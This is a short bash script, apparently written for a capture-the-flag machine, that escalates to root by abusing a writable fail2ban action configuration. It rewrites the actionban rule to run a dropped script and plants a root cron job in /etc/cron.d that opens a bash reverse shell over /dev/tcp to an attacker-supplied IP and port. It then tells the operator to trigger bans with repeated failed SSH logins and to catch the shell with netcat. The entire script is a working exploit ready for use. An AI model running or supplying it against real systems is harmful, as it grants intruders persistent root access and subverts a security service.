#!/bin/bash

# Fail2ban privesc (sshd service)
# ----------------


# Remote machine
# ---------------

# actionban config file
fail2ban_rule_conf=/etc/fail2ban/action.d/iptables-multiport.conf

# check user:group permissions (root:root)
ls -l $fail2ban_rule_conf

# change user:group to writeable permisisons
cp $fail2ban_rule_conf{,.bak}
mv -f $fail2ban_rule_conf.bak $fail2ban_rule_conf

# check user:group permission (michale:michael)
ls -l $fail2ban_rule_conf

# commands to create cron process to receive privileged reverse shell
if [ -d "/tmp/.privesc" ]; then
  rm -rf "/tmp/.privesc"
fi 
create_dir="mkdir /tmp/.privesc"
assing_cron="echo '* * * * * root /bin/sh /tmp/.privesc/pwned.sh' > /etc/cron.d/pwned;"
cron_script="echo \"bash -c 'bash -i >& /dev/tcp/$1/$2 0>&1'\" > /tmp/.privesc/pwned.sh;"
add_perm="chmod +x /tmp/.privesc/pwned.sh;"

# save commands in file
$create_dir
echo -e "$assing_cron\n$cron_script\n$add_perm" > /tmp/.privesc/cmd.sh
chmod +x /tmp/.privesc/cmd.sh

# change actionban to execute malicious file
sed -i 's/actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>/actionban = \/bin\/bash \/tmp\/.privesc\/cmd.sh/g' $fail2ban_rule_conf

# restart fail2ban service 
sudo /etc/init.d/fail2ban restart


# Local machine
# -------------

sleep 3
echo -e "\nMake failed ssh requests in ATTACKER machine to activate fail2ban rules (maxretry = 5)"
echo "Example: for i in \$(seq 1 6); do sshpass -p 'anything' ssh michael@10.10.11.166; done"

echo -e "\nListen on IP $1 through PORT $2 to receive the shell. (g.e nc -lvnp $2)\n"

